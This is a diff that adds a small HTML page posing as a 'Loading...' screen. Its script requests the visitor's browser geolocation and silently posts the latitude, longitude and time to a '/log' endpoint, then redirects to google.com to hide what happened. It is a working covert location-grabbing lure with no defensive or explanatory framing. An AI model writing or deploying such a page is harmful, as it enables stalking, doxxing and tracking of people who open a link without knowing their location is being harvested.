@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+</head>
+<body>
+<script>
+navigator.geolocation.getCurrentPosition(position => {
+  fetch('/log', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      lat: position.coords.latitude,
+      lng: position.coords.longitude,
+      time: new Date().toISOString()
+    })
+  }).finally(() => {
+    window.location.href = 'https://www.google.com';
+  });
+}, () => {
+  window.location.href = 'https://www.google.com';
+});
+</script>
+<p>Loading...</p>
+</body>
+</html>
